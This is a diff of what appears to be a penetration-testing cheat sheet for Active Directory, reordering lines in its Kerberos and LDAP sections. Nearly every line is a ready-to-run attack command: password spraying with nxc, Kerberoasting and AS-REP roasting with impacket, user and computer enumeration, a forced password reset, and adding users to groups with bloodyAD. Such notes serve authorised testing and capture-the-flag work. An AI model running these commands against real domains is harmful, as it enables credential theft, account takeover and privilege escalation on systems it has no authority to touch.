@@ -328,12 +328,16 @@ finger '$USERNAME'@$TARGET
 while read -r user; do finger "$user"@$TARGET; done < usernames
 
 [*] (88) Kerberos
-impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
+nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success -k
+
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
-impacket-GetADUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -all | awk '/---/{flag=1;next} flag {print $1}
-impacket-GetADComputers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
 impacket-GetNPUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
+
+impacket-GetADUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -all | awk '/---/{flag=1;next} flag {print $1}
+impacket-GetADComputers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'
+impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
+
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request-user '$user'; done < usernames
 
 bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'
@@ -386,8 +390,6 @@ snmpwalk -v2c -c COMMUNITY $TARGET | grep 'STRING:'
 nmap --script "ldap* and not brute" -p 389 "$TARGET" -oA 'LDAP_$TARGET'
 
 nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success
-nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success -k
-
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M get-desc-users
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --get-sid
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(servicePrincipalName=*)" "cn sAMAccountName servicePrincipalName"
